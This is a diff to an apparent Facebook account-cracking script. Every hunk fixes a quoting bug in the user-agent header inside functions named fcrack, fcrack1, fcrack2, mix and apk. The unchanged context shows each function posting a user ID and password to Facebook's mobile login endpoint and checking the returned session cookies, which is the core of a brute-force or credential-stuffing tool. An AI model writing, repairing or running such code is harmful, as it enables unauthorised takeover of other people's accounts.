@@ -691,7 +691,7 @@ def apk(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'pro,
+    'user-agent': pro,
     'viewport-width': '980',}
 
             lo = session.post('https://mobile.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
@@ -756,7 +756,7 @@ def mix(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'pro,
+    'user-agent': pro,
     'viewport-width': '980',}
             lo = session.post('https://mobile.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -819,7 +819,7 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'pro,
+    'user-agent': pro,
     'viewport-width': '980',}
             lo = session.post('https://mobile.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -882,7 +882,7 @@ def fcrack1(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'pro,
+    'user-agent': pro,
     'viewport-width': '980',}
             lo = session.post('https://mobile.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -947,7 +947,7 @@ def fcrack2(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'pro,
+    'user-agent': pro,
     'viewport-width': '980',}
             lo = session.post('https://mobile.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
